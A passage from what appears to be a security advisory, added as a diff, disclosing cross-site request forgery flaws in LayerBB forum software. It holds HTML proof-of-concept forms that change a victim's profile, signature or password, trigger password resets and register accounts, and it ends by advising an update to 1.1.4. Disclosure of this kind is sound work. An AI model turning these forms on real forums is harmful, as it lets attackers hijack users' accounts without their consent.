value="CL">Chile</option><option value="CM">Cameroon</option><option value="CN">China</option><option value="CO">Colombia</option><option value="CR">Costa Rica</option><option value="CU">Cuba</option><option value="CV">Cabo Verde</option><option value="CW">Curacao</option><option value="CX">Christmas Island</option><option value="CY">Cyprus</option><option value="CZ">Czech Republic</option><option value="DE">Germany</option><option value="DJ">Djibouti</option><option value="DK">Denmark</option><option value="DM">Dominica</option><option value="DO">Dominican Republic</option><option value="DZ">Algeria</option><option value="EC">Ecuador</option><option value="EE">Estonia</option><option value="EG">Egypt</option><option value="EH">Western Sahara</option><option value="ER">Eritrea</option><option value="ES">Spain</option><option value="ET">Ethiopia</option><option value="FI">Finland</option><option value="FJ">Fiji</option><option value="FK">Falkland Islands</option><option value="FM">Micronesia</option><option value="FO">Faroe Islands</option><option value="FR">France</option><option value="GA">Gabon</option><option value="GB">United Kingdom</option><option value="GD">Grenada</option><option value="GE">Georgia</option><option value="GF">French Guiana</option><option value="GG">Guernsey</option><option value="GH">Ghana</option><option value="GI">Gibraltar</option><option value="GL">Greenland</option><option value="GM">Gambia</option><option value="GN">Guinea</option><option value="GP">Guadeloupe</option><option value="GQ">Equatorial Guinea</option><option value="GR">Greece</option><option value="GS">South Georgia and the South Sandwich Islands</option><option value="GT">Guatemala</option><option value="GU">Guam</option><option value="GW">Guinea-Bissau</option><option value="GY">Guyana</option><option value="HK">Hong Kong</option><option value="HM">Heard Island and McDonald Islands</option><option value="HN">Honduras</option><option value="HR">Croatia</option><option value="HT">Haiti</option><option value="HU">Hungary</option><option value="ID">Indonesia</option><option value="IE">Ireland</option><option value="IL">Israel</option><option value="IM">Isle of Man</option><option value="IN">India</option><option value="IO">British Indian Ocean Territory</option><option value="IQ">Iraq</option><option value="IR">Iran</option><option value="IS">Iceland</option><option value="IT">Italy</option><option value="JE">Jersey</option><option value="JM">Jamaica</option><option value="JO">Jordan</option><option value="JP">Japan</option><option value="KE">Kenya</option><option value="KG">Kyrgyzstan</option><option value="KH">Cambodia</option><option value="KI">Kiribati</option><option value="KM">Comoros</option><option value="KN">Saint Kitts and Nevis</option><option value="KP">The Democratic People's Republic of Korea</option><option value="KR">The Republic of Korea</option><option value="KW">Kuwait</option><option value="KY">Cayman Islands</option><option value="KZ">Kazakhstan</option><option value="LA">Lao People's Democratic Republic</option><option value="LB">Lebanon</option><option value="LC">Saint Lucia</option><option value="LI">Liechtenstein</option><option value="LK">Sri Lanka</option><option value="LR">Liberia</option><option value="LS">Lesotho</option><option value="LT">Lithuania</option><option value="LU">Luxembourg</option><option value="LV">Latvia</option><option value="LY">Libya</option><option value="MA">Morocco</option><option value="MC">Monaco</option><option value="MD">Moldova</option><option value="ME">Montenegro</option><option value="MF">Saint Martin</option><option value="MG">Madagascar</option><option value="MH">Marshall Islands</option><option value="MK">Macedonia</option><option value="ML">Mali</option><option value="MM">Myanmar</option><option value="MN">Mongolia</option><option value="MO">Macao</option><option value="MP">Northern Mariana Islands</option><option value="MQ">Martinique</option><option value="MR">Mauritania</option><option value="MS">Montserrat</option><option value="MT">Malta</option><option value="MU">Mauritius</option><option value="MV">Maldives</option><option value="MW">Malawi</option><option value="MX">Mexico</option><option value="MY">Malaysia</option><option value="MZ">Mozambique</option><option value="NA">Namibia</option><option value="NC">New Caledonia</option><option value="NE">Niger</option><option value="NF">Norfolk Islands</option><option value="NG">Nigeria</option><option value="NI">Nicaragua</option><option value="NL">Netherlands</option><option value="NO">Norway</option><option value="NP">Nepal</option><option value="NR">Nauru</option><option value="NU">Niue</option><option value="NZ">New Zealand</option><option value="OM">Oman</option><option value="PA">Panama</option><option value="PE">Peru</option><option value="PF">French Polynesia</option><option value="PG">Papua New Guinea</option><option value="PH">Philippines</option><option value="PK">Pakistan</option><option value="PL">Poland</option><option value="PM">Saint Pierre and Miquelon</option><option value="PN">Pitcairn</option><option value="PR">Puerto Rico</option><option value="PS">Palestine</option><option value="PT">Portugal</option><option value="PW">Palau</option><option value="PY">Paraguay</option><option value="QA">Qatar</option><option value="RE">Réunion</option><option value="RO">Romania</option><option value="RS">Serbia</option><option value="RU">Russian Federation</option><option value="RW">Rwanda</option><option value="SA">Saudi Arabia</option><option value="SB">Solomon Islands</option><option value="SC">Seychelles</option><option value="SD">Sudan</option><option value="SE">Sweden</option><option value="SG">Singapore</option><option value="SH">Saint Helena</option><option value="SI">Slovenia</option><option value="SJ">Svalbard and Jan Mayen</option><option value="SK">Slovakia</option><option value="SL">Sierra Leone</option><option value="SM">San Marino</option><option value="SN">Senegal</option><option value="SO">Somalia</option><option value="SR">Suriname</option><option value="SS">South Sudan</option><option value="ST">Sao Tome and Pricipe</option><option value="SV">El Salvador</option><option value="SX">Sint Maarten</option><option value="SY">Syrian Arab Republic</option><option value="SZ">Swaziland</option><option value="TC">Turks and Caicos Islands</option><option value="TD">Chad</option><option value="TF">French Southern Terrotories</option><option value="TG">Togo</option><option value="TH">Thailand</option><option value="TJ">Tajikistan</option><option value="TK">Tokelau</option><option value="TL">Timor-Leste</option><option value="TM">Turkmenistan</option><option value="TN">Tunisia</option><option value="TO">Tonga</option><option value="TR">Turkey</option><option value="TT">Trinidad and Tobago</option><option value="TV">Tuvalu</option><option value="TW">Taiwan</option><option value="TZ">Tanzania</option><option value="UA">Ukraine</option><option value="UG">Uganda</option><option value="UM">United States Minor Outlying Islands</option><option value="US">United States</option><option value="UY">Uruguay</option><option value="UZ">Uzbekistan</option><option value="VA">Holy See</option><option value="VC">Venezuela</option><option value="VG">Virgin Islands (GB)</option><option value="VI">Virgin Islands (US)</option><option value="VN">Viet Nam</option><option value="VU">Vanatu</option><option value="WF">Wallis and Futuna</option><option value="WS">Samoa</option><option value="YE">Yemen</option><option value="YT">Mayotte</option><option value="ZA">South Africa</option><option value="ZM">Zambia</option><option value="ZW">Zimbabwe</option></select>
+    <br>
+    <label for="birthday">Birthday</label>
+    <input type="text" name="birthday" id="birthday" value="0000-00-00">
+    <span id="helpBlock" class="help-block">In the format of: YYYY-MM-DD</span>
+    <label for="editor">About You</label><br>
+    <textarea name="about" id="editor" style="min-width: 100%; max-width: 100%; height: 150px;"></textarea>
+    <br>
+    <div class="panel panel-default">
+    <div class="panel-heading">Additional Profile Fields</div>
+    <div class="panel-body"></div>
+    </div>
+    <br>
+    <input type="submit" name="edit" value="Save Changes">
+</form>
+<!-- Edit Profile CSRF End -->
+
+<!-- Edit Signature CSRF -->
+<form id="LAYER_form" action="http://localhost/profile.php/cmd/signature" method="POST" style="padding: 25px;">
+    <label for="sig">Signature</label>
+    <textarea name="sig" id="editor" style="width: 100%; height: 300px; max-width: 100%; min-width: 100%;"></textarea>
+    <br><br>
+    <input type="submit" name="edit" value="Save Changes">
+</form>
+<!-- Edit Signature CSRF End -->
+
+<!-- Change Password CSRF -->
+<form id="LAYER_form" action="http://localhost/profile.php/cmd/password" method="POST" style="padding: 35px;">
+    <label for="current_password">Current Password</label>
+    <input type="password" name="current_password" id="current_password">
+    <label for="new_password">New Password</label>
+    <input type="password" name="new_password" id="new_password">
+    <br><br>
+    <input type="submit" name="edit" value="Save Changes">
+</form>
+<!-- Change Password CSRF End -->
+
+<!-- Forgot Password CSRF -->
+<form action="http://localhost/members.php/cmd/forgotpassword" method="POST" id="LAYER_form" style="padding: 25px;">
+    <label for="email">Email</label>
+    <input type="text" name="email" id="email" class="form-control">
+    <br><br>
+    <input type="submit" name="forget" value="Send Email" class="btn btn-default">
+</form>
+<!-- Forgot Password CSRF End -->
+
+<!-- Reset Password CSRF -->
+<form action="http://localhost/members.php/cmd/resetpassword" method="POST" id="LAYER_form" style="padding: 25px;">
+    <label for="password">Password</label>
+    <input type="password" name="password" id="password" class="form-control">
+    <label for="a_password">Confirm Password</label>
+    <input type="password" name="a_password" id="a_password" class="form-control">
+    <br><br>
+    <input type="submit" name="reset" value="Reset Password" class="btn btn-default">
+</form>
+<!-- Reset Password CSRF End -->
+
+<!-- Register Account CSRF -->
+<form action="http://localhost/members.php/cmd/register" method="POST" style="padding: 25px;">
+    <label for="username">Username</label>
+    <input type="text" name="username" value="" id="username" class="form-control">
+    <label for="password">Password</label>
+    <input type="password" name="password" id="password" class="form-control">
+    <label for="a_password">Confirm Password</label>
+    <input type="password" name="a_password" id="a_password" class="form-control">
+    <label for="email">Email</label>
+    <input type="text" name="email" value="" id="email" class="form-control">
+    <label for="LayerBB_captcha">Are you a bot?</label><br>
+    <img src="http://localhost/public/img/captcha.php" alt="LayerBB Captcha"><br><input type="text" id="LayerBB_captcha" name="LayerBB_captcha">
+    <br><br>
+    <input type="submit" name="register" value="Register" class="btn btn-default">
+    By clicking "Register", you agree to abide by the forum rules located <a href="http://localhost/members.php/cmd/rules">here</a>.
+</form>
+<!-- Register Account CSRF End -->
+
+
+
+3. Solution:
+Update to 1.1.4
